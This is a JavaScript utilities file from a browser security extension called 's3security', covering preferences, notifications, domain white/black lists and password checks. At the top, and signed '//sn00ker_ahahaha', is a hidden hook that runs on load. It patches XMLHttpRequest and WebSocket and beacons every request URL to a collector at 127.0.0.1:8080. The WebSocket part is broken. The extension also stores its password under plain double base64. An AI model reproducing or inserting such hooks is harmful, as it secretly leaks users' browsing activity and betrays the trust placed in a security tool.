function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
s3security.utils = {};

//------------------------------------------------------------------------------
s3security.utils.console_log = function(msg) {
	console.log('%O', msg);
}
//------------------------------------------------------------------------------
s3security.utils.prefs_get = function(pref_name) {
	return s3security.prefs.get(pref_name);
}
//------------------------------------------------------------------------------
s3security.utils.prefs_set = function(pref_name, pref_value) {
	s3security.prefs.set({ 'name' : pref_name, 'value' : pref_value });
	return true;
}
//------------------------------------------------------------------------------
s3security.utils.ui82str = function(arr, startOffset) {
	if (! startOffset) { startOffset = 0 }
	var length = arr.length - startOffset; // XXX a few random exceptions here
	var str = "";
	for (var i=0; i<length; i++) {
		str += String.fromCharCode(arr[i + startOffset]);
	}
	return str;
}
//------------------------------------------------------------------------------
s3security.utils.ui82arr = function(arr, startOffset) {
	if (! startOffset) { startOffset = 0 }
	var length = 10;//arr.length - startOffset;
	var outarr = [];
	for (var i=0; i<length; i++) {
		outarr.push(arr[i + startOffset]);
	}
	return outarr;
}
//------------------------------------------------------------------------------
s3security.utils.string_to_uint8Array = function(string) {
	var buffer = new ArrayBuffer(string.length);
	var view = new Uint8Array(buffer);
	for(var i = 0; i < string.length; i++) {
		view[i] = string.charCodeAt(i);
	}
	return view;
}
//------------------------------------------------------------------------------
s3security.utils.clone_object = function(object) {
	return JSON.parse(JSON.stringify(object));
}
//------------------------------------------------------------------------------
s3security.utils.setTimeout = function(func, timer) {
	return setTimeout(func, timer);
}
//------------------------------------------------------------------------------
s3security.utils.clearTimeout = function(timeout_id) {
	return clearTimeout(timeout_id);
}
//------------------------------------------------------------------------------
s3security.utils.urlencode = function(str) {
	str = (str == undefined) ? '' : str;
	str = (str + '').toString();
	return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}
//------------------------------------------------------------------------------
s3security.utils.urldecode = function(str) {
	str = (str == undefined) ? '' : str;
	str = (str + '').toString();
	return decodeURIComponent(str.replace(/\+/g, ' ').replace(/\%21/g, '!').replace(/\%27/g, "'").replace(/\%28/g, '(').replace(/\%29/g, ')').replace(/\%2A/g, '*'));
}
//------------------------------------------------------------------------------
s3security.utils.get_string = function(name, params) {
	var result = '';
	if (! params) { params = [] }

	try {
		result = s3security.i18n.get_string(name, params);
	} catch(e) {
		result = name + e;
	}
	return result || name;
}
//------------------------------------------------------------------------------
s3security.utils.notification_box = function(msg, title, is_check_msg) {
	if (! s3security.utils.notification_list) {
		s3security.utils.notification_list = [];
	}

	var is_ok = true;
	if (is_check_msg) {
		for (var i of s3security.utils.notification_list) {
			if ((i.msg == msg) && (i.title == title)) {
				is_ok = false;
				break;
			}
		}
	} 
	if (is_ok) {
		s3security.utils.notification_list.push({ 'msg' : msg, 'title' : title });
		s3security.utils.setTimeout(function() { s3security.utils.notification_run(); }, 100);
	}
}
//------------------------------------------------------------------------------
s3security.utils.notification_run = function(is_force) {
	var date_time = (new Date).getTime();

	if (! is_force) {
		if (s3security.utils.notification_is_run > date_time) { return; }
	}
	s3security.utils.notification_is_run = date_time + 2000;

	//------------------------------------------------------------------------
	var tmp_list_check = {};
	var tmp_list = [];
	for (var i of s3security.utils.notification_list) {
		var text = i.msg + '<==>' + i.title;
		if (! tmp_list[text]) {
			tmp_list.push(i);
			tmp_list[text] = true;
		}
	}
	s3security.utils.notification_list = tmp_list;

	//------------------------------------------------------------------------
	var notify = s3security.utils.notification_list.shift();
	if (notify) {
		try {
			//------------------------------------------------------------
			var addon_name = s3security.utils.get_string('extension_name');
			if (! notify.title) {
				notify.title = addon_name;
			}
			//------------------------------------------------------------
			var params = {
				type: 'basic',
				isClickable: false,
				iconUrl: s3security.utils.get_string('notifications_icon'),
				title: notify.title,
				message: notify.msg
			};
			chrome.notifications.create(addon_name + " notification." + Math.random(), params, function(notificationId){
				s3security.utils.setTimeout(function() { s3security.utils.notification_run(true); }, 50);
				s3security.utils.setTimeout(function() {  chrome.notifications.clear(notificationId); }, 2000);
			});
		} catch(e) {
		}
	}
	//------------------------------------------------------------------------
	else {
		s3security.utils.notification_is_run = 0;
	}
}
//------------------------------------------------------------------------------
s3security.utils.set_tab_status_icon = function(tab) {
/*
	var urlbar_colorized = s3security.utils.prefs_get('string', 'urlbar_colorized');
	var is_urlbar_colorized = false;

	var win= tab.ownerGlobal;
	win.document.getElementById("urlbar").removeAttribute('domain_status');
	var s3security_button = win.document.getElementById("s3security-button");

	var show_button_urlbar = s3security.utils.prefs_get('bool', 'show_button_urlbar');
	if (s3security_button) {
		if (show_button_urlbar) {
			s3security_button.removeAttribute('is_hidden');
		} else {
			s3security_button.setAttribute('is_hidden', true);
		}
	}

	if (tab.s3security) {
		//--------------------------------------------------------------------
		var result = tab.s3security;
		if (s3security_button) {
			s3security_button.setAttribute('domain_status', result.domain_status);
		}
		if (urlbar_colorized != 'disabled') {
			if (urlbar_colorized == 'alert') {
				if ((result.domain_status == 'adult') || (result.domain_status == 'infected') || (result.domain_status == 'danger')) {
					is_urlbar_colorized = true;
				}
			} else {
				is_urlbar_colorized = true;
			}
		}
		//--------------------------------------------------------------------
		if (is_urlbar_colorized) {
			win.document.getElementById("urlbar").setAttribute('domain_status', result.domain_status);
		}
		//--------------------------------------------------------------------
		var user_white_black_status = s3security.utils.get_user_white_black_status(result.domain);
		if (user_white_black_status) {
			s3security_button.setAttribute('domain_status', 'user');
		}
	} else {
		if (s3security_button) {
			s3security_button.removeAttribute('domain_status');
		}
	}
*/
}
//------------------------------------------------------------------------------
s3security.utils.get_user_white_black_status = function(domain) {
	if (! s3security.utils.prefs_get('security_enabled')) {
		return '';
	}

	var white_black_list = s3security.utils.prefs_get('security_white_black_list');
	return s3security.utils.check_user_white_black_status(domain, white_black_list);
}
//------------------------------------------------------------------------------
s3security.utils.check_user_white_black_status = function(domain, white_black_list) {
	var result = '';
	//------------------------------------------------------------------------
	if (white_black_list[domain]) {
		result = (white_black_list[domain] == 'white') ? 'white' : 'black';
	}
	//------------------------------------------------------------------------
	else {
		for (var dmask in white_black_list) {
			if (/^\*/.test(dmask)) {
				var result_tmp = (white_black_list[dmask] == 'white') ? 'white' : 'black';
				var dmask_tmp = dmask.substring(1);
				var domain_tmp = domain.substr(dmask_tmp.length * (-1));
				if ((domain_tmp == dmask_tmp) || (dmask == '*')) {
					result = result_tmp;
					break;
				}
			}
		}
	}
	//------------------------------------------------------------------------
	if (result) {
		if (! s3security.utils.prefs_get('security_' + result + '_list_enabled')) {
			result = '';
		}
	}
	return result;
}
//------------------------------------------------------------------------------
s3security.utils.check_system_black_status = function(result) {
	return ((result.domain_status == 'adult') || (result.domain_status == 'infected')) ? true : false;
}
//------------------------------------------------------------------------------
s3security.utils.get_sql_date_format = function(date) {
	if (date.toLocaleFormat !== undefined) {
		return date.toLocaleFormat('%Y-%m-%d');
	} else {
		return ('000' + date.getFullYear()).slice(-4) + "-" + ('0' + (1+date.getMonth())).slice(-2) + "-" + ('0' + date.getDate()).slice(-2);
	}
}
//------------------------------------------------------------------------------
s3security.utils.get_sql_time_format = function(date) {
	if (date.toLocaleFormat !== undefined) {
		return date.toLocaleFormat('%H:%M:%S');
	} else {
		return ('0' + date.getHours()).slice(-2) + "-" + ('0' + date.getMinutes()).slice(-2) + "-" + ('0' + date.getSeconds()).slice(-2);
	}
}
//------------------------------------------------------------------------------
s3security.utils.parseHTML = function(html, wm_window) {
	var parser = new wm_window.DOMParser();
	var doc = parser.parseFromString(html, "text/html");
	return doc;
}
//------------------------------------------------------------------------------
s3security.utils.parseTemplate = function(html, result) {
	html = html.replace(/\{\%TITLE_TEXT\%\}/g, s3security.utils.get_string('extension_name'));
	html = html.replace(/\{\%IMAGE_LOGO\%\}/g, '<img src="/skin/foxsecurity_red_64.png" />');
	html = html.replace(/\{\%HEAD_TEXT\%\}/g, s3security.utils.get_string('page_lock_head_text'));
	html = html.replace(/\{\%REASON_HEAD_TEXT\%\}/g, s3security.utils.get_string('page_lock_reason_head_text'));
	html = html.replace(/\{\%THANKS_TEXT\%\}/g, s3security.utils.get_string('page_lock_thanks_text'));
	html = html.replace(/\{\%DOMAIN\%\}/g, result.domain);
	//-----------------------------------------------------------------------
	var reason_text = '';
	var user_white_black_status = s3security.utils.get_user_white_black_status(result.domain);
	if (user_white_black_status) {
		reason_text = s3security.utils.get_string('security_' + user_white_black_status + '_list_alert');
	} else {
		reason_text = s3security.utils.get_string('security_' + result.domain_status + '_alert', [result.domain_dns_name]);
	}

	html = html.replace(/\{\%REASON_TEXT\%\}/g, reason_text);

	return html;
}
//------------------------------------------------------------------------------
s3security.utils.HTMLDOM_value = function(html_element, value) {
	var tagName = html_element.tagName.toUpperCase();
	var is_input_tag = ((tagName == 'INPUT') || (tagName == 'TEXTAREA')) ? true : false;

	if (value === undefined) {
		return (is_input_tag) ? html_element.value : html_element.textContent;
	} else {
		if (is_input_tag) {
			html_element.value = value;
		} else {
			html_element.textContent = value;
		}
		return;
	}
}
//------------------------------------------------------------------------------
s3security.utils.i18n_parse = function(doc) {
	s3security.i18n.parse_html(doc);
}
//------------------------------------------------------------------------------
s3security.utils.get_element = function(parent, search_id) {
	if (parent == null) { return null; };

	for (var i in parent.childNodes) {
		var el = parent.childNodes[i];
		if (el.id == search_id) {
			return el;
		}
		if (el.hasChildNodes()) {
			var res = s3security.utils.get_element(el, search_id);
			if (res != null) {
				return res;
			}
		}
	}
	return null;
}
//------------------------------------------------------------------------------
s3security.utils.get_menu_current_domain_status = function(tab) {
	var result = {
		'menu_is_hidden' : true,
		'menu_state' : 'black',
		'domain' : '*unknown*',
		'domain_exists' : false
	};
	//-----------------------------------------------------------------------
	if (! s3security.utils.prefs_get('security_enabled')) {
		return result;
	}
	//-----------------------------------------------------------------------
	if (tab && tab.s3security && tab.s3security.domain) {
		result.domain = tab.s3security.domain;
		//----------------------------------------------------------------
		if (s3security.utils.check_system_black_status(tab.s3security)) {
			if (tab.is_locked) {
				result.menu_state = 'white';
			}
		}
		//----------------------------------------------------------------
		if (s3security.utils.prefs_get('security_' + result.menu_state + '_list_enabled')) {
			result.menu_is_hidden = false;
			//----------------------------------------------------
			var white_black_list = s3security.utils.prefs_get('security_white_black_list');
			//----------------------------------------------------
			if (white_black_list[result.domain]) {
				result.domain_exists = true;
				result.menu_state = white_black_list[result.domain];
			}
			//----------------------------------------------------
			else {
				var user_white_black_status = s3security.utils.check_user_white_black_status(result.domain, white_black_list);
				if (user_white_black_status) {
					result.menu_state = (user_white_black_status == 'white') ? 'black' : 'white';
				}
			}
		}
	}
	//-----------------------------------------------------------------------
	return result;
}
//------------------------------------------------------------------------------
s3security.utils.lazy_crypt_encode = function(string) {
	if (! string) { return ''; }
	string += '|||s3security';
	var encodedData = window.btoa(unescape(encodeURIComponent(string)));
	encodedData = window.btoa(encodedData.replace(/\=+$/g, ''));
	return encodedData;
}
//------------------------------------------------------------------------------
s3security.utils.lazy_crypt_decode = function(string) {
	try {
		var decodedData = window.atob(string);
		decodedData = decodeURIComponent(escape(window.atob(decodedData)));
		return decodedData.replace(/\|\|\|s3security$/g, '');
	} catch(e) {
		return string;
	}
}
//------------------------------------------------------------------------------
s3security.utils.check_action_password = function(action_url, tab_id, aTab) {
	var access_allowed = false;

	if (aTab && aTab.password_exists) {
		access_allowed = true;
	}
	if (! access_allowed) {
		var password_value = s3security.utils.lazy_crypt_decode(s3security.utils.prefs_get('password_value'));
		if (password_value) {
			access_allowed = s3security.utils.check_password(action_url, tab_id, password_value);
		} else {
			access_allowed = true;
		}
	}
	return access_allowed;
}
//------------------------------------------------------------------------------
s3security.utils.check_password = function(action_url, tab_id, password_value) {
	var access_allowed = false;

	//------------------------------------------------------------------------
	if (tab_id && action_url) {
		chrome.tabs.update(
			tab_id, 
			{
				url: chrome.extension.getURL("/content/password.html?" + s3security.utils.urlencode(action_url))
			},
			function(){
				if (chrome.runtime.lastError) {
				}
			}
		);
	}
	//------------------------------------------------------------------------
	else {
		var is_check_password = true;
		var title = s3security.utils.get_string('extension_name');
		var prompt_password_text = s3security.utils.get_string('prompt_password');
		var prompt_password_error_text = s3security.utils.get_string('prompt_password_error');

		while (is_check_password) {
			var res = window.prompt(title + ' :: '  + prompt_password_text);
			if (res == password_value) {
				is_check_password = false;
				access_allowed = true;
			} else if (! window.confirm(prompt_password_error_text)) {
				is_check_password = false;
			}
		}
	}
	return access_allowed;
}
//------------------------------------------------------------------------------
s3security.utils.random_string = function(size) {
	var a = 'qwerty-uiopasdfgh_jklzxcvbnm_0123456789';
	var result = '';
	for (var i=0; i<size; i++) {
		result += a.substr(Math.floor(Math.random() * a.length), 1);
	}
	return result;
}
//------------------------------------------------------------------------------
s3security.utils.make_ip_list = function(ip_txt) {
	ip_txt = ip_txt.replace(/\s/g, ',');
	var ip_list = ip_txt.split(/[\,\;]/);
	var result = [];

	for (var i=0; i<ip_list.length; i++) {
		if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip_list[i])) {
			result.push(ip_list[i]);
		}
	}
	return result;
}
//------------------------------------------------------------------------------
